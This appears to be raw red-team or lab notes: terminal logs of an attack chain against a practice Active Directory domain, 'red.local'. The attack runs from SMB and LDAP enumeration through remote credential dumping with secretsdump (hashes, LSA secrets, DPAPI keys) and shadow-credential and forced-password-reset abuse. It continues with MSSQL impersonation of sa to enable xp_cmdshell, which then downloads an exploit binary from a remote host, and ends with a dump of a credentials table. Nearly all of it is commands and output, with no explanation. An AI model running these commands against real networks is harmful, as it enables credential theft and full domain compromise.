SMB         10.2.10.14      445    HR-PC-413        -----           -----------     ------
SMB         10.2.10.14      445    HR-PC-413        ADMIN$                          Remote Admin
SMB         10.2.10.14      445    HR-PC-413        C$                              Default share
SMB         10.2.10.14      445    HR-PC-413        IPC$            READ            Remote IPC
SMB         10.2.10.12      445    MAILSRV-2        [+] red.local\web_svc:123-ilovejess 
SMB         10.2.10.15      445    IT-INTERN-19     [*] Enumerated shares
SMB         10.2.10.15      445    IT-INTERN-19     Share           Permissions     Remark
SMB         10.2.10.15      445    IT-INTERN-19     -----           -----------     ------
SMB         10.2.10.15      445    IT-INTERN-19     ADMIN$                          Remote Admin
SMB         10.2.10.15      445    IT-INTERN-19     C$                              Default share
SMB         10.2.10.15      445    IT-INTERN-19     IPC$            READ            Remote IPC
SMB         10.2.10.13      445    DBSRV-2          [+] red.local\web_svc:123-ilovejess 
SMB         10.2.10.11      445    DC               [*] Enumerated shares
SMB         10.2.10.11      445    DC               Share           Permissions     Remark
SMB         10.2.10.11      445    DC               -----           -----------     ------
SMB         10.2.10.11      445    DC               ADMIN$                          Remote Admin
SMB         10.2.10.11      445    DC               C$                              Default share
SMB         10.2.10.11      445    DC               IPC$            READ            Remote IPC
SMB         10.2.10.11      445    DC               NETLOGON        READ            Logon server share 
SMB         10.2.10.11      445    DC               SYSVOL          READ            Logon server share 
SMB         10.2.10.12      445    MAILSRV-2        [*] Enumerated shares
SMB         10.2.10.12      445    MAILSRV-2        Share           Permissions     Remark
SMB         10.2.10.12      445    MAILSRV-2        -----           -----------     ------
SMB         10.2.10.12      445    MAILSRV-2        ADMIN$                          Remote Admin
SMB         10.2.10.12      445    MAILSRV-2        C$                              Default share
SMB         10.2.10.12      445    MAILSRV-2        IPC$            READ            Remote IPC
SMB         10.2.10.13      445    DBSRV-2          [*] Enumerated shares
SMB         10.2.10.13      445    DBSRV-2          Share           Permissions     Remark
SMB         10.2.10.13      445    DBSRV-2          -----           -----------     ------
SMB         10.2.10.13      445    DBSRV-2          ADMIN$                          Remote Admin
SMB         10.2.10.13      445    DBSRV-2          C$                              Default share
SMB         10.2.10.13      445    DBSRV-2          IPC$            READ            Remote IPC

```


```python
kali@kali ~> rusthound -d red.local -u web_svc -p '123-ilovejess' -n 10.2.10.11 -z -v
---------------------------------------------------
Initializing RustHound at 12:17:37 on 03/05/25
Powered by g0h4n from OpenCyber
---------------------------------------------------

[2025-03-05T17:17:37Z INFO  rusthound] Verbosity level: Debug
[2025-03-05T17:17:37Z DEBUG rusthound::ldap] IP: not set
[2025-03-05T17:17:37Z DEBUG rusthound::ldap] PORT: not set
[2025-03-05T17:17:37Z DEBUG rusthound::ldap] FQDN: not set
[2025-03-05T17:17:37Z DEBUG rusthound::ldap] Url: ldap://red.local
[2025-03-05T17:17:37Z DEBUG rusthound::ldap] Domain: red.local
[2025-03-05T17:17:37Z DEBUG rusthound::ldap] Username: web_svc@red.local
[2025-03-05T17:17:37Z DEBUG rusthound::ldap] Email: web_svc@red.local
[2025-03-05T17:17:37Z DEBUG rusthound::ldap] Password: 123-ilovejess
[2025-03-05T17:17:37Z DEBUG rusthound::ldap] DC: ["DC=red,DC=local"]
[2025-03-05T17:17:37Z DEBUG rusthound::ldap] ADCS: false
[2025-03-05T17:17:37Z DEBUG rusthound::ldap] Kerberos: false
[2025-03-05T17:17:38Z DEBUG rusthound::ldap] Trying to connect with simple_bind() function (username:password)
[2025-03-05T17:17:38Z INFO  rusthound::ldap] Connected to RED.LOCAL Active Directory!
[2025-03-05T17:17:38Z INFO  rusthound::ldap] Starting data collection...
[2025-03-05T17:17:42Z INFO  rusthound::ldap] All data collected for NamingContext DC=red,DC=local
[2025-03-05T17:17:42Z INFO  rusthound::json::parser] Starting the LDAP objects parsing...
[2025-03-05T17:17:42Z INFO  rusthound::json::parser::bh_41] MachineAccountQuota: 10
⠂                                                                                                                                                                                                                   [2025-03-05T17:17:42Z DEBUG rusthound::json::parser::bh_41] Parse Container: CN=USERS,DC=RED,DC=LOCAL                                                                                                               
⠄ Parsing LDAP objects: 0%                                                                                                                                                                                          [2025-03-05T17:17:42Z DEBUG rusthound::json::parser::bh_41] Parse Container: CN=COMPUTERS,DC=RED,DC=LOCAL                                                                                                           
⡀ Parsing LDAP objects: 0%                                                                                                                                                                                          [2025-03-05T17:17:42Z DEBUG rusthound::json::parser::bh_41] Parse OU: OU=DOMAIN CONTROLLERS,DC=RED,DC=LOCAL                                                                                                         
⢀ Parsing LDAP objects: 0%                                                                                                                                                                                          [2025-03-05T17:17:42Z DEBUG rusthound::json::parser::bh_41] Parse Container: CN=SYSTEM,DC=RED,DC=LOCAL                                                                                                              
⠈ Parsing LDAP objects: 1%                                                                                                                                                                                          [2025-03-05T17:17:42Z DEBUG rusthound::json::parser::bh_41] Parse Container: CN=FOREIGNSECURITYPRINCIPALS,DC=RED,DC=LOCAL                                                                                           
⠁ Parsing LDAP objects: 1%                                                                                                                                                                                          [2025-03-05T17:17:42Z DEBUG rusthound::json::parser::bh_41] Parse Container: CN=PROGRAM DATA,DC=RED,DC=LOCAL                                                                                                        
⠂ Parsing LDAP objects: 2%                                                                                                                                                                                          [2025-03-05T17:17:42Z DEBUG rusthound::json::parser::bh_41] Parse Container: CN=MICROSOFT,CN=PROGRAM DATA,DC=RED,DC=LOCAL                                                                                           
⡀ Parsing LDAP objects: 2%                                                                                                                                                                                          [2025-03-05T17:17:42Z DEBUG rusthound::json::parser::bh_41] Parse Container: CN=MANAGED SERVICE ACCOUNTS,DC=RED,DC=LOCAL                                                                                            
⢀ Parsing LDAP objects: 3%                                                                                                                                                                                          [2025-03-05T17:17:42Z DEBUG rusthound::json::parser::bh_41] Parse Container: CN=WINSOCKSERVICES,CN=SYSTEM,DC=RED,DC=LOCAL                                                                                           
[2025-03-05T17:17:42Z DEBUG rusthound::json::parser::bh_41] Parse Container: CN=RPCSERVICES,CN=SYSTEM,DC=RED,DC=LOCAL
⠠ Parsing LDAP objects: 3%                                                                                                                                                                                          [2025-03-05T17:17:42Z DEBUG rusthound::json::parser::bh_41] Parse Container: CN=MEETINGS,CN=SYSTEM,DC=RED,DC=LOCAL                                                                                                  
[2025-03-05T17:17:42Z DEBUG rusthound::json::parser::bh_41] Parse Container: CN=POLICIES,CN=SYSTEM,DC=RED,DC=LOCAL
[2025-03-05T17:17:42Z DEBUG rusthound::json::parser::bh_41] Parse gpo: CN={31B2F340-016D-11D2-945F-00C04FB984F9},CN=POLICIES,CN=SYSTEM,DC=RED,DC=LOCAL
[2025-03-05T17:17:42Z DEBUG rusthound::json::parser::bh_41] Parse gpo: CN={6AC1786C-016F-11D2-945F-00C04FB984F9},CN=POLICIES,CN=SYSTEM,DC=RED,DC=LOCAL
[2025-03-05T17:17:42Z DEBUG rusthound::json::parser::bh_41] Parse Container: CN=RAS AND IAS SERVERS ACCESS CHECK,CN=SYSTEM,DC=RED,DC=LOCAL
[2025-03-05T17:17:42Z DEBUG rusthound::json::parser::bh_41] Parse Container: CN=ADMINSDHOLDER,CN=SYSTEM,DC=RED,DC=LOCAL
⠐ Parsing LDAP objects: 14%                                                                                                                                                                                         [2025-03-05T17:17:42Z DEBUG rusthound::json::parser::bh_41] Parse Container: CN=COMPARTITIONS,CN=SYSTEM,DC=RED,DC=LOCAL                                                                                             
[2025-03-05T17:17:42Z DEBUG rusthound::json::parser::bh_41] Parse Container: CN=COMPARTITIONSETS,CN=SYSTEM,DC=RED,DC=LOCAL
[2025-03-05T17:17:42Z DEBUG rusthound::json::parser::bh_41] Parse Container: CN=WMIPOLICY,CN=SYSTEM,DC=RED,DC=LOCAL

```



```python
kali@kali ~> proxychains -q nxc smb 10.2.10.0/24 -u 'web_svc' -p '123-ilovejess' -M spider_plus
SMB         10.2.10.15      445    IT-INTERN-19     [*] Windows 11 Build 22621 x64 (name:IT-INTERN-19) (domain:red.local) (signing:False) (SMBv1:False)
SMB         10.2.10.11      445    DC               [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:red.local) (signing:True) (SMBv1:False)
SMB         10.2.10.14      445    HR-PC-413        [*] Windows 11 Build 22621 x64 (name:HR-PC-413) (domain:red.local) (signing:False) (SMBv1:False)
SMB         10.2.10.15      445    IT-INTERN-19     [+] red.local\web_svc:123-ilovejess 
SPIDER_PLUS 10.2.10.15      445    IT-INTERN-19     [*] Started module spidering_plus with the following options:
SPIDER_PLUS 10.2.10.15      445    IT-INTERN-19     [*]  DOWNLOAD_FLAG: False
SPIDER_PLUS 10.2.10.15      445    IT-INTERN-19     [*]     STATS_FLAG: True
SPIDER_PLUS 10.2.10.15      445    IT-INTERN-19     [*] EXCLUDE_FILTER: ['print$', 'ipc$']
SPIDER_PLUS 10.2.10.15      445    IT-INTERN-19     [*]   EXCLUDE_EXTS: ['ico', 'lnk']
SPIDER_PLUS 10.2.10.15      445    IT-INTERN-19     [*]  MAX_FILE_SIZE: 50 KB
SPIDER_PLUS 10.2.10.15      445    IT-INTERN-19     [*]  OUTPUT_FOLDER: /tmp/nxc_hosted/nxc_spider_plus
SMB         10.2.10.11      445    DC               [+] red.local\web_svc:123-ilovejess 
SPIDER_PLUS 10.2.10.11      445    DC               [*] Started module spidering_plus with the following options:
SPIDER_PLUS 10.2.10.11      445    DC               [*]  DOWNLOAD_FLAG: False
SPIDER_PLUS 10.2.10.11      445    DC               [*]     STATS_FLAG: True
SPIDER_PLUS 10.2.10.11      445    DC               [*] EXCLUDE_FILTER: ['print$', 'ipc$']
SPIDER_PLUS 10.2.10.11      445    DC               [*]   EXCLUDE_EXTS: ['ico', 'lnk']
SPIDER_PLUS 10.2.10.11      445    DC               [*]  MAX_FILE_SIZE: 50 KB
SPIDER_PLUS 10.2.10.11      445    DC               [*]  OUTPUT_FOLDER: /tmp/nxc_hosted/nxc_spider_plus
SMB         10.2.10.14      445    HR-PC-413        [+] red.local\web_svc:123-ilovejess 
SPIDER_PLUS 10.2.10.14      445    HR-PC-413        [*] Started module spidering_plus with the following options:
SPIDER_PLUS 10.2.10.14      445    HR-PC-413        [*]  DOWNLOAD_FLAG: False
SPIDER_PLUS 10.2.10.14      445    HR-PC-413        [*]     STATS_FLAG: True
SPIDER_PLUS 10.2.10.14      445    HR-PC-413        [*] EXCLUDE_FILTER: ['print$', 'ipc$']
SPIDER_PLUS 10.2.10.14      445    HR-PC-413        [*]   EXCLUDE_EXTS: ['ico', 'lnk']
SPIDER_PLUS 10.2.10.14      445    HR-PC-413        [*]  MAX_FILE_SIZE: 50 KB
SPIDER_PLUS 10.2.10.14      445    HR-PC-413        [*]  OUTPUT_FOLDER: /tmp/nxc_hosted/nxc_spider_plus
SMB         10.2.10.15      445    IT-INTERN-19     [*] Enumerated shares
SMB         10.2.10.15      445    IT-INTERN-19     Share           Permissions     Remark
SMB         10.2.10.15      445    IT-INTERN-19     -----           -----------     ------
SMB         10.2.10.15      445    IT-INTERN-19     ADMIN$                          Remote Admin
SMB         10.2.10.15      445    IT-INTERN-19     C$                              Default share
SMB         10.2.10.15      445    IT-INTERN-19     IPC$            READ            Remote IPC
SPIDER_PLUS 10.2.10.15      445    IT-INTERN-19     [+] Saved share-file metadata to "/tmp/nxc_hosted/nxc_spider_plus/10.2.10.15.json".
SPIDER_PLUS 10.2.10.15      445    IT-INTERN-19     [*] SMB Shares:           3 (ADMIN$, C$, IPC$)
SPIDER_PLUS 10.2.10.15      445    IT-INTERN-19     [*] SMB Readable Shares:  1 (IPC$)
SPIDER_PLUS 10.2.10.15      445    IT-INTERN-19     [*] SMB Filtered Shares:  1
SPIDER_PLUS 10.2.10.15      445    IT-INTERN-19     [*] Total folders found:  0
SPIDER_PLUS 10.2.10.15      445    IT-INTERN-19     [*] Total files found:    0
SMB         10.2.10.14      445    HR-PC-413        [*] Enumerated shares
SMB         10.2.10.14      445    HR-PC-413        Share           Permissions     Remark
SMB         10.2.10.14      445    HR-PC-413        -----           -----------     ------
SMB         10.2.10.14      445    HR-PC-413        ADMIN$                          Remote Admin
SMB         10.2.10.14      445    HR-PC-413        C$                              Default share
SMB         10.2.10.14      445    HR-PC-413        IPC$            READ            Remote IPC
SPIDER_PLUS 10.2.10.14      445    HR-PC-413        [+] Saved share-file metadata to "/tmp/nxc_hosted/nxc_spider_plus/10.2.10.14.json".
SPIDER_PLUS 10.2.10.14      445    HR-PC-413        [*] SMB Shares:           3 (ADMIN$, C$, IPC$)
SPIDER_PLUS 10.2.10.14      445    HR-PC-413        [*] SMB Readable Shares:  1 (IPC$)
SPIDER_PLUS 10.2.10.14      445    HR-PC-413        [*] SMB Filtered Shares:  1
SPIDER_PLUS 10.2.10.14      445    HR-PC-413        [*] Total folders found:  0
SPIDER_PLUS 10.2.10.14      445    HR-PC-413        [*] Total files found:    0
SMB         10.2.10.13      445    DBSRV-2          [*] Windows Server 2022 Build 20348 (name:DBSRV-2) (domain:red.local) (signing:False) (SMBv1:False)
SMB         10.2.10.13      445    DBSRV-2          [-] Connection Error: Error while reading from remote
SMB         10.2.10.11      445    DC               [*] Enumerated shares
SMB         10.2.10.11      445    DC               Share           Permissions     Remark
SMB         10.2.10.11      445    DC               -----           -----------     ------
SMB         10.2.10.11      445    DC               ADMIN$                          Remote Admin
SMB         10.2.10.11      445    DC               C$                              Default share
SMB         10.2.10.11      445    DC               IPC$            READ            Remote IPC
SMB         10.2.10.11      445    DC               NETLOGON        READ            Logon server share 
SMB         10.2.10.11      445    DC               SYSVOL          READ            Logon server share 
SMB         10.2.10.12      445    MAILSRV-2        [*] Windows Server 2022 Build 20348 (name:MAILSRV-2) (domain:red.local) (signing:False) (SMBv1:False)
SMB         10.2.10.12      445    MAILSRV-2        [-] Connection Error: Error while reading from remote
SPIDER_PLUS 10.2.10.11      445    DC               [+] Saved share-file metadata to "/tmp/nxc_hosted/nxc_spider_plus/10.2.10.11.json".
SPIDER_PLUS 10.2.10.11      445    DC               [*] SMB Shares:           5 (ADMIN$, C$, IPC$, NETLOGON, SYSVOL)
SPIDER_PLUS 10.2.10.11      445    DC               [*] SMB Readable Shares:  3 (IPC$, NETLOGON, SYSVOL)
SPIDER_PLUS 10.2.10.11      445    DC               [*] SMB Filtered Shares:  1
SPIDER_PLUS 10.2.10.11      445    DC               [*] Total folders found:  16
SPIDER_PLUS 10.2.10.11      445    DC               [*] Total files found:    5
SPIDER_PLUS 10.2.10.11      445    DC               [*] File size average:    1.49 KB
SPIDER_PLUS 10.2.10.11      445    DC               [*] File size min:        22 B
SPIDER_PLUS 10.2.10.11      445    DC               [*] File size max:        3.68 KB
Running nxc against 256 targets ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━ 100% 0:00:00
kali@kali ~> cat /tmp/nxc_hosted/nxc_spider_plus/10.2.10.11.json
{                                                                                                                                                                                                                   
    "NETLOGON": {},                                                                                                                                                                                                 
    "SYSVOL": {                                                                                                                                                                                                     
        "red.local/Policies/{31B2F340-016D-11D2-945F-00C04FB984F9}/GPT.INI": {                                                                                                                                      
            "atime_epoch": "2025-03-02 12:11:48",                                                                                                                                                                   
            "ctime_epoch": "2025-03-02 10:18:40",                                                                                                                                                                   
            "mtime_epoch": "2025-03-02 12:11:48",                                                                                                                                                                   
            "size": "22 B"                                                                                                                                                                                          
        },                                                                                                                                                                                                          
        "red.local/Policies/{31B2F340-016D-11D2-945F-00C04FB984F9}/MACHINE/Microsoft/Windows NT/SecEdit/GptTmpl.inf": {                                                                                             
            "atime_epoch": "2025-03-02 10:23:16",                                                                                                                                                                   
            "ctime_epoch": "2025-03-02 10:18:40",                                                                                                                                                                   
            "mtime_epoch": "2025-03-02 10:23:16",                                                                                                                                                                   
            "size": "1.07 KB"                                                                                                                                                                                       
        },                                                                                                                                                                                                          
        "red.local/Policies/{31B2F340-016D-11D2-945F-00C04FB984F9}/MACHINE/Registry.pol": {                                                                                                                         
            "atime_epoch": "2025-03-02 12:11:48",                                                                                                                                                                   
            "ctime_epoch": "2025-03-02 12:11:48",                                                                                                                                                                   
            "mtime_epoch": "2025-03-02 12:11:48",                                                                                                                                                                   
            "size": "2.67 KB"                                                                                                                                                                                       
        },
        "red.local/Policies/{6AC1786C-016F-11D2-945F-00C04fB984F9}/GPT.INI": {
            "atime_epoch": "2025-03-02 10:18:40",
            "ctime_epoch": "2025-03-02 10:18:40",
            "mtime_epoch": "2025-03-02 10:18:46",
            "size": "22 B"
        },
        "red.local/Policies/{6AC1786C-016F-11D2-945F-00C04fB984F9}/MACHINE/Microsoft/Windows NT/SecEdit/GptTmpl.inf": {
            "atime_epoch": "2025-03-02 10:18:40",
            "ctime_epoch": "2025-03-02 10:18:40",
            "mtime_epoch": "2025-03-02 10:18:46",
            "size": "3.68 KB"
        }
    }
}⏎                                                                                                                                                                                                                  kali@kali ~> cat /tmp/nxc_hosted/nxc_spider_plus/10.2.10.14.json
{}⏎                                                                                                                                                                                                                 kali@kali ~> cat /tmp/nxc_hosted/nxc_spider_plus/10.2.10.15.json
{}⏎                                                                                                                                                                                                                 kali@kali ~> 

```


```python
kali@kali ~ [SIGINT]> secretsdump.py red.local/'HR_2205185':'TempPass123!'@10.2.10.15 -debug
Impacket v0.13.0.dev0+20241024.90011.835e175 - Copyright Fortra, LLC and its affiliated companies 

[+] Impacket Library Installation Path: /home/kali/.local/share/pipx/venvs/impacket/lib/python3.12/site-packages/impacket
[*] Service RemoteRegistry is in stopped state
[*] Service RemoteRegistry is disabled, enabling it
[*] Starting service RemoteRegistry
[+] Retrieving class info for JD
[+] Retrieving class info for Skew1
[+] Retrieving class info for GBG
[+] Retrieving class info for Data
[*] Target system bootKey: 0x1a5ad1285300ef40125c99e3b1d2b195
[+] Checking NoLMHash Policy
[+] LMHashes are NOT being stored
[+] Saving remote SAM database
[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
[+] Calculating HashedBootKey from SAM
[+] NewStyle hashes is: True
Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
[+] NewStyle hashes is: True
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
[+] NewStyle hashes is: True
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
[+] NewStyle hashes is: True
WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:8d2f348f2b4b2b5d4a52dc665f995698:::
[+] Saving remote SECURITY database
[*] Dumping cached domain logon information (domain/username:hash)
[+] Decrypting LSA Key
[+] Decrypting NL$KM
[+] Looking into NL$1
[+] Looking into NL$2
[+] Looking into NL$3
[+] Looking into NL$4
[+] Looking into NL$5
[+] Looking into NL$6
[+] Looking into NL$7
[+] Looking into NL$8
[+] Looking into NL$9
[+] Looking into NL$10
[*] Dumping LSA Secrets
[+] Looking into $MACHINE.ACC
[*] $MACHINE.ACC 
red\IT-INTERN-19$:aes256-cts-hmac-sha1-96:49a234fbfc3914f2ff1dbf2e9ddccdb945ba5e7cdb8d3d14cdd99a5a510e5f85
red\IT-INTERN-19$:aes128-cts-hmac-sha1-96:c4d52d946024f5eaee34be9c2e929643
red\IT-INTERN-19$:des-cbc-md5:7334384f8092b376
red\IT-INTERN-19$:plain_password_hex:35005b002a003c0035006b004d00700053007400760029002a006700760050004800430032002c0061002c007700420020004a0057006b004b0051003a003c00260032004c0041006600790022002b002600370071005a002d004d003e002600700070003b002f002c005c0051003e004800640029004c0052005a0035005f003800610059005900470055006c004100400032002b006e00280040005b002e007400350043005a003400600075006400280065002600600039004c006a00360039004b00530026004c005e002a00680034002d004900470027007a0059002000200036002d0027002d0037004e003d00
red\IT-INTERN-19$:aad3b435b51404eeaad3b435b51404ee:f3d8f46e34ac557833b01ebe96f1ef98:::
[+] Looking into CachedDefaultPassword
[+] Discarding secret CachedDefaultPassword, NULL Data
[+] Looking into DefaultPassword
[*] DefaultPassword 
red.local\rangeadm:password
[+] Looking into DPAPI_SYSTEM
[*] DPAPI_SYSTEM 
dpapi_machinekey:0x7f3d280d003c20b80d108342c8c3c599f17cda76
dpapi_userkey:0x1f00a97539d2d1753ebf32fda2b001a0740713a8

```


```python
kali@kali ~> secretsdump.py red.local/'HR_2205185':'TempPass123!'@10.2.10.12 -debug
Impacket v0.13.0.dev0+20250307.160229.6e0a969 - Copyright Fortra, LLC and its affiliated companies 

[+] Impacket Library Installation Path: /home/kali/.local/lib/python3.12/site-packages/impacket
[*] Service RemoteRegistry is in stopped state
[*] Starting service RemoteRegistry
[+] Retrieving class info for JD
[+] Retrieving class info for Skew1
[+] Retrieving class info for GBG
[+] Retrieving class info for Data
[*] Target system bootKey: 0x816c9cb6ea50273a99fe6202183c0c5d
[+] Checking NoLMHash Policy
[+] LMHashes are NOT being stored
[+] Saving remote SAM database
[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
[+] Calculating HashedBootKey from SAM
[+] NewStyle hashes is: True
Administrator:500:aad3b435b51404eeaad3b435b51404ee:8846f7eaee8fb117ad06bdd830b7586c:::
[+] NewStyle hashes is: True
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
[+] NewStyle hashes is: True
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
[+] NewStyle hashes is: True
WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:0420b30f66d482711ca65b5bbd034e32:::
[+] Saving remote SECURITY database
[*] Dumping cached domain logon information (domain/username:hash)
[+] Decrypting LSA Key
[+] Decrypting NL$KM
[+] Looking into NL$1
[+] Looking into NL$2
[+] Looking into NL$3
[+] Looking into NL$4
[+] Looking into NL$5
[+] Looking into NL$6
[+] Looking into NL$7
[+] Looking into NL$8
[+] Looking into NL$9
[+] Looking into NL$10
[*] Dumping LSA Secrets
[+] Looking into $MACHINE.ACC
[*] $MACHINE.ACC 
red\MAILSRV-2$:aes256-cts-hmac-sha1-96:b511409d1f8fb194dc7ac96dab9f99fc4f944bb35f5ba6aa2c656c232b3f673c
red\MAILSRV-2$:aes128-cts-hmac-sha1-96:9433c8d53e121ca97ec6d17848332dad
red\MAILSRV-2$:des-cbc-md5:94913d018a6b8910
red\MAILSRV-2$:plain_password_hex:2a0057002b005b007a0068006d0031002a00500074007300250049004b00640042004c00490071002f006700530067003a003f0047003d0075005f0028002d004c002c0041005a0079004e00370061003d00360029002f0053004d005600640071006a003f00700035006500350058003200760049003d002400400027006a003e004b005600710053006d003400300050004900690077004f005400670063005000790035002e007800430024006d00780021004f005d002400510027007900400078006f004900570023006b0051006d006700740057002b0066006d00780060005b00630053005700580060003800
red\MAILSRV-2$:aad3b435b51404eeaad3b435b51404ee:3daa09f4f6f43a43a3ee694511a9d34a:::
[+] Looking into DefaultPassword
[*] DefaultPassword 
red.local\rangeadm:password
[+] Looking into DPAPI_SYSTEM
[*] DPAPI_SYSTEM 
dpapi_machinekey:0xb9120fe1cb4f7356f61ed6d953606d2b29ee6eac
dpapi_userkey:0x426c28958e169b842cd2d72f2f7c0f0d2d1a6734
[+] Looking into NL$KM
[*] NL$KM 
 0000   AD A8 78 92 30 DD 2F 08  F7 24 FE 41 72 7A EF 38   ..x.0./..$.Arz.8
 0010   6D 38 22 98 93 61 4A D9  78 78 BA 5C 25 AF 86 A7   m8"..aJ.xx.\%...
 0020   3B FE 57 BB 43 8A 36 B2  6B 6F 95 13 1B A8 F2 64   ;.W.C.6.ko.....d
 0030   48 3F 55 7A B4 7C A4 FF  16 60 C3 24 45 18 AC AD   H?Uz.|...`.$E...
NL$KM:ada8789230dd2f08f724fe41727aef386d38229893614ad97878ba5c25af86a73bfe57bb438a36b26b6f95131ba8f264483f557ab47ca4ff1660c3244518acad
[+] Exiting NTDSHashes.dump() because SAMR SessionError: code: 0xc00000df - STATUS_NO_SUCH_DOMAIN - The specified domain did not exist.
[*] Cleaning up... 
[*] Stopping service RemoteRegistry


```

```python
    "authentication": {
      "use_ssl": true,
      "use_tls": false,
      "max_attempts": 5,
      "lockout_duration": 30,
      "smtp_username": "mailadmin",
      "smtp_password": "sOEpehS3cRedpa55w0rd!"
    },

```


```python
kali@kali ~> pywhisker -d "red.local" -u "SvcAccountMgr" -p "JNSFGjhdhfsdgklk2" --target "SVC_SQL_BACKUP" --action "add"
[*] Searching for the target account
[*] Target user found: CN=Svc_Sql_Backup,CN=Users,DC=red,DC=local
[*] Generating certificate
[*] Certificate generated
[*] Generating KeyCredential
[*] KeyCredential generated with DeviceID: 87018101-7c03-c703-68c2-74c16fd183dd
[*] Updating the msDS-KeyCredentialLink attribute of SVC_SQL_BACKUP
[+] Updated the msDS-KeyCredentialLink attribute of the target object
[+] Saved PFX (PKCS12) certificate & key at path: NJNsL2fk.pfx
[*] Must be used with password: VC9w9GzEOCZwUULdhZC3
[*] A TGT can now be obtained with https://github.com/dirkjanm/PKINITtools
kali@kali ~> pywhisker -d "red.local" -u "SvcAccountMgr" -p "JNSFGjhdhfsdgklk2" --target "SVC_SQL_BACKUP" --action "list"
[*] Searching for the target account
[*] Target user found: CN=Svc_Sql_Backup,CN=Users,DC=red,DC=local
[*] Listing devices for SVC_SQL_BACKUP
[*] DeviceID: 87018101-7c03-c703-68c2-74c16fd183dd | Creation Time (UTC): 2025-03-06 14:38:35.443838

```




```python
kali@kali ~> bloodyAD --host 10.2.10.11 -d red.local -u 'SvcAccountMgr' -p 'JNSFGjhdhfsdgklk2' set password 'SVC_SQL_BACKUP' 'TemPass123!'
```


```python
kali@kali ~> mssqlclient.py red.local/'svc_sql_backup':'TemPass123!'@'10.2.10.13' -dc-ip 10.2.10.11 -debug -windows-auth
```


`EXECUTE AS LOGIN = 'SA'; EXEC sp_configure 'show advanced options', 1; RECONFIGURE; EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;`





```python
SQL (sa  dbo@master)> EXEC xp_cmdshell 'powershell -ExecutionPolicy Unrestricted -Command "Invoke-WebRequest -Uri ''https://github.com/decoder-it/NetworkServiceExploit/releases/download/20200504/NetworkServiceExploit.exe'' -OutFile ''C:\Users\Public\Downloads\NetworkServiceExploit.exe'' -UseBasicParsing"';
output   
------   
NULL     


```








10.2.10.15

```python
C:\Windows\Temp> netsh advfirewall firewall show rule name=all
                                                                                                                                                                                                                                             
netsh advfirewall firewall show rule name=all                                                                                                                                                                                                
                                                                                                                                                                                                                                             
Rule Name:                            Allow RDP                                                                                                                                                                                              
----------------------------------------------------------------------                                                                                                                                                                       
Enabled:                              Yes                                                                                                                                                                                                    
Direction:                            In                                                                                                                                                                                                     
Profiles:                             Domain,Private,Public                                                                                                                                                                                  
Grouping:                                                                                                                                                                                                                                    
LocalIP:                              Any                                                                                                                                                                                                    
RemoteIP:                             Any                                                                                                                                                                                                    
Protocol:                             TCP                                                                                                                                                                                                    
LocalPort:                            445                                                                                                                                                                                                    
RemotePort:                           Any                                                                                                                                                                                                    
Edge traversal:                       No                                                                                                                                                                                                     
Action:                               Allow                                                                                                                                                                                                  
Rule Name:                            Microsoft Edge (mDNS-In)
----------------------------------------------------------------------
Enabled:                              Yes
Direction:                            In
Profiles:                             Domain,Private,Public
Grouping:                             Microsoft Edge WebView2 Runtime
LocalIP:                              Any
RemoteIP:                             Any
Protocol:                             UDP
LocalPort:                            5353
RemotePort:                           Any
Edge traversal:                       No
Action:                               Allow


Rule Name:                            Allow WinRM HTTPS
----------------------------------------------------------------------
Enabled:                              Yes
Direction:                            In
Profiles:                             Domain,Private,Public
Grouping:                             
LocalIP:                              Any
RemoteIP:                             Any
Protocol:                             TCP
LocalPort:                            5986 <-------------------------------------- IMPORTANT
RemotePort:                           Any
Edge traversal:                       No
Action:                               Allow

Rule Name:                            Media Center Extenders - qWave (TCP-In)
----------------------------------------------------------------------
Enabled:                              No
Direction:                            In
Profiles:                             Domain,Private,Public
Grouping:                             Media Center Extenders
LocalIP:                              Any
RemoteIP:                             LocalSubnet
Protocol:                             TCP
LocalPort:                            2177
RemotePort:                           Any
Edge traversal:                       No
Action:                               Allow


```



```powershell

SQL (sa  dbo@redDB)> select * from usercredentials
id   username          password           full_name                  email                              dob          address                              phone_number       country          created_at                                     
--   ---------------   ----------------   ------------------------   --------------------------------   ----------   ----------------------------------   ----------------   --------------   -------------------                            
59   MgmtAdmin         OIJFGr4jlkgr       Management Administrator   MgmtAdmin@red.local                1989-03-25   90 Pipit Rd, Singapore 370090        +65-6841-1085      SG               2025-03-07 22:40:09                            
                                                                                                                                                                                                                                             
60   luffy_d           GomuGomuNo123      Monkey D. Luffy            luffy.d@email.jp                   1997-05-05   Foosha Village, East Blue            +81-90-1234-5678   Japan            2025-03-07 22:40:09                            
                                                                                                                                                                                                                                             
61   itachi_u          Tsukuyomi!         Itachi Uchiha              itachi.uchiha@email.jp             1987-06-09   Hidden Leaf Village                  +81-90-4444-5678   Japan            2025-03-07 22:40:09                            

62   gojo_s            UnlimitedVoid!     Satoru Gojo                gojo.satoru@email.jp               1989-12-07   Tokyo Jujutsu High                   +81-90-7654-3210   Japan            2025-03-07 22:40:09   

63   killua_z          GodspeedXHunter    Killua Zoldyck             killua.zoldyck@email.jp            1999-07-07   Zoldyck Estate                       +81-70-9999-0000   Japan            2025-03-07 22:40:09   

64   walter_w          SayMyName!         Walter White               walter.white@email.us              1958-09-07   308 Negra Arroyo Lane, Albuquerque   +1-505-555-0111    USA              2025-03-07 22:40:09   

65   jessep            YeahScience!       Jesse Pinkman              jesse.pinkman@email.us             1984-09-24   RV in the Desert, Albuquerque        +1-505-555-0123    USA              2025-03-07 22:40:09   

66   sherlock_h        Deduction99!       Sherlock Holmes            sherlock.holmes@email.uk           1854-01-06   221B Baker Street, London            +44-20-7946-0958   UK               2025-03-07 22:40:09   

